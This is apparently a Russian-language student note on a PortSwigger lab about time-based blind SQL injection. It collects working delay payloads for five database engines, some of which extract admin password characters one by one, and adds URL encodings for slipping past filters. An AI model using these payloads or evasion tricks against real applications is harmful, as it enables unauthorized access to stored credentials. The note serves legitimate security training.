# Blind SQL injection vulnerabilities
# *СЛЕПЫЕ SQLi  (4/7 лаба в этой теме)

## time delays - ВРЕМЕННЫЕ ЗАДЕРЖКИ!  time delays
https://portswigger.net/web-security/sql-injection/blind/lab-time-delays


# КОНЦЕПЦИЯ
```sql
'; IF (1=2) WAITFOR DELAY '0:0:10'-- 
'; IF (1=1) WAITFOR DELAY '0:0:10'--

 // видимая  PostgreSQL
'; SELECT CASE WHEN 1=2 THEN pg_sleep(10) END; --
'// слепая  PostgreSQL
' AND (SELECT pg_sleep(10) FROM users WHERE username='admin' AND SUBSTR(password,1,1)='a') --



`'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--`
```

# сама лаба # Blind SQL injection with time delays


```sql СПЕРВА ТЕСТИМ ПЕРВЫЕ ВАРИАНТЫ 
-------------------------------------------------------------------
//🟣🟣🟣 SQLite
' AND (SELECT CASE WHEN (1=1) THEN LIKE('ABCDEFG', UPPER(HEX(RANDOMBLOB(100000000)))) ELSE 0 END)=1--
----- 
'||LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000))))--
'||(SELECT randomblob(100000000))--
'||(SELECT COUNT(*) FROM sqlite_master a,sqlite_master b,sqlite_master c)--
-------------------------------------------------------------------
'//🟣🟣🟣 Oracle
' AND (SELECT CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP(10) ELSE 0 END FROM dual)=0--
-----
'||DBMS_LOCK.SLEEP(10)--
'||(SELECT COUNT(*) FROM all_objects a,all_objects b,all_objects c) FROM dual--
-------------------------------------------------------------------
''//🟣🟣🟣Microsoft SQL Server
' AND 1=(SELECT CASE WHEN (1=1) THEN 1 ELSE (SELECT COUNT(*) FROM sys.objects o1, sys.objects o2, sys.objects o3, sys.objects o4, sys.objects o5, sys.objects o6) END)--
-----
'||WAITFOR DELAY '0:0:10'--
'||(SELECT COUNT(*) FROM sys.objects a,sys.objects b,sys.objects c)--
-------------------------------------------------------------------
'''//🟣🟣🟣MySQL / MariaDB
' AND (SELECT IF(1=1, SLEEP(10), 'a'))='a'--
-----
'||sleep(10)--
'||BENCHMARK(10000000,MD5('test'))--
'||IF(1=1,SLEEP(10),0)--
-------------------------------------------------------------------
//🟣🟣🟣PostgreSQL
сработал этот в этой лабе
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END) IS NOT NULL--
-----
'||pg_sleep(10)-- 
'||(SELECT COUNT(*) FROM generate_series(1,10000000))--
-------------------------------------------------------------------
```

как выполнил лабу:
перепробовал на всех страничках '  ''   "   ""
но реакции не было вообще!
число полученных байт не менялось
контент на странице тоже не менялся

подбирал пейлоады которые вызвали бы временную задержку
и тупо подставив этой пейлоад 
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END) IS NOT NULL--

задержка в ответе составила 10сек
все - лаба выполнена! далее в теории можно побайтово вытаскивать данные! если (условие да) - то выплнить задержку time based
waf не было



```|Символ|URL-encoded|Примечание|
|---|---|---|
|**`'`** (кавычка)|`%27`|Ваш основной символ|
|**`"`** (двойная кавычка)|`%22`|Часто блокируется|
|(пробел)|`%20` или `+`|`%20` — надёжнее|
|**`-`** (дефис/минус)|`%2d`||
|**`--`** (SQL комментарий)|`%2d%2d`|Часто блокируется WAF|

### 🔤 Буквы слова "sleep" и "and":

#### **Для слова "sleep":**

- `sleep` → `%73%6c%65%65%70`
    
- **По буквам:**
    
    - `s` → `%73`
        
    - `l` → `%6c`
        
    - `e` → `%65`
        
    - `e` → `%65`
        
    - `p` → `%70`
        

#### **Для слова "and":**

- `and` → `%61%6e%64`
    
- **По буквам:**
    
    - `a` → `%61`
        
    - `n` → `%6e`
        
    - `d` → `%64`
```
